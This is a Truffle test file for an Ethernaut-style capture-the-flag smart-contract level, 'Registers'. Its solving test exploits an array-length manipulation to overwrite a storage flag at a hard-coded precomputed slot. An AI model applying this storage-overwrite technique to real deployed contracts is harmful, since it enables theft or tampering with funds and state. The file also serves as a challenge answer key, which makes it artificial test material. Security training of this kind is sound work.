const RegistersFactory = artifacts.require('RegistersFactory')
const Registers = artifacts.require('Registers')

//const RegistersAttack = artifacts.require('./attacks/RegistersAttack.sol')

const Ethernaut = artifacts.require('./Ethernaut.sol')

const { soliditySha3 } = require("web3-utils");

import * as utils from '../utils/TestUtils'
const { expectRevert } = require('@openzeppelin/test-helpers');
const truffleAssert = require('truffle-assertions');

contract('Registers', function(accounts) {

    let ethernaut;
    let level;
    let owner = accounts[0];
    let player = accounts[1];

    before(async function() {
        ethernaut = await Ethernaut.new();
        level = await RegistersFactory.new()
        await ethernaut.registerLevel(level.address)
    });

    it('should fail if the player did not solve the level', async function() {
        const instance = await utils.createLevelInstance(ethernaut, level.address, player, Registers)

        await truffleAssert.reverts(instance.winChall())

        const completed = await utils.submitLevelInstance(
            ethernaut,
            level.address,
            instance.address,
            player
        )

        assert.isFalse(completed)
    });

    

    it('should allow the player to solve the level', async function() {
        const instance = await utils.createLevelInstance(ethernaut, level.address, player, Registers)

        await instance.removeInfos(1, {from:player})

        // Magic. This was computed from a specific sender address
        var index2 = '0x3ba2dd0086d9649c4d4311cc2b4654f004bb6747da375af689a26c233b177498'
        // This will overwrite cleared with 1 (size of A)
        await instance.updateInfo(index2, "0x41", {from:player})

        const completed = await utils.submitLevelInstance(
            ethernaut,
            level.address,
            instance.address,
            player
        )

        assert.isTrue(completed)
    });

});
